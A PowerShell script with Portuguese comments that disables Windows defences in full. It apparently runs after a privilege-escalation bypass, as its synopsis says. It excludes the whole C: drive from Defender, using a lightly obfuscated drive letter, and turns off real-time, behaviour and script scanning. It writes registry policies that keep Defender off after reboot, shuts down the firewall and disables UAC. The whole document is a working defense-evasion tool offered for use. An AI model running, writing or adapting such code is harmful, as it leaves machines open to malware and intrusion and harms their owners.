<#
.SYNOPSIS
    Script de desativação completa das defesas do Windows.
    Deve ser executado como Administrador (já estará elevado pelo bypass).
#>

Write-Host "[*] Iniciando desativação das defesas..." -ForegroundColor Cyan

# 1. Exclusão do disco C:\ (garantia)
$drive = [char]67 + ':\'
Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue
Write-Host "[1] Exclusão do C:\ aplicada."

# 2. Desativar todas as proteções do Defender via PowerShell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0
Write-Host "[2] Proteções em tempo real desativadas."

# 3. Criar políticas de registro para manter desativado após reboot
$defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$rtpPath = "$defenderPath\Real-Time Protection"
New-Item -Path $defenderPath -Force | Out-Null
New-Item -Path $rtpPath -Force | Out-Null

New-ItemProperty -Path $defenderPath -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $defenderPath -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $rtpPath -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $rtpPath -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $rtpPath -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWORD -Force
Write-Host "[3] Políticas de registro criadas."

# 4. Desligar o Firewall do Windows
netsh advfirewall set allprofiles state off
Write-Host "[4] Firewall desligado."

# 5. Desabilitar UAC
$systemPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $systemPath -Name "EnableLUA" -Value 0 -Force
Set-ItemProperty -Path $systemPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
Set-ItemProperty -Path $systemPath -Name "PromptOnSecureDesktop" -Value 0 -Force
Write-Host "[5] UAC desabilitado."

Write-Host "[+] Todas as defesas foram desativadas com sucesso." -ForegroundColor Green
